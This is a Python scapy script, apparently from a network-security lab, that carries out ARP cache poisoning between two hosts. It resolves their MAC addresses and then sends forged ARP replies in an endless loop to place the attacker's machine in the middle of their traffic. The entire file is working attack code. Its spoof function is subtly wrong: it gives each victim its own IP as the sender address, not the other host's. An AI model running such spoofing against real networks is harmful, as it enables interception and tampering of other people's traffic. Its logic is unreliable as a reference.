#!/usr/bin/env python3
from scapy.all import*
import time

interval = 5

Mac_in_d_middle='02:42:0a:09:00:69' #own MAC
src_ip='10.9.0.6'#spoofed source
dst_ip='10.9.0.5' #target

def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff") #create ethernet frame
    packet = ether/arp_request #combine Ether frame and ARP request packet

    # Send the packet and capture the response
    result = srp(packet, timeout=3, verbose=0)[0]

    # Extract the MAC address from the response
    return result[0][1].hwsrc if result else None


def show_info(ip, mac):
        if mac:
                print(f"MAC address of {ip}: {mac}")
        else:
                print(f"Unable to retrieve MAC address for {ip}")


def spoof(victim_ip, victim_mac, hack_mac):
        eth = Ether(src=hack_mac, dst=victim_mac)
        arp = ARP(hwsrc=hack_mac, psrc=victim_ip, hwdst=victim_mac ,op=2)
        packet = eth/arp
        sendp(packet)

try:
        src_mac = get_mac(src_ip) #mac B
        dst_mac = get_mac(dst_ip) #mac A

        show_info(src_ip, src_mac)
        show_info(dst_ip, dst_mac)

        while True:
                spoof(src_ip, src_mac, Mac_in_d_middle)
                spoof(dst_ip, dst_mac, Mac_in_d_middle)
                time.sleep(interval)

except KeyboardInterrupt:
        print("stopped")

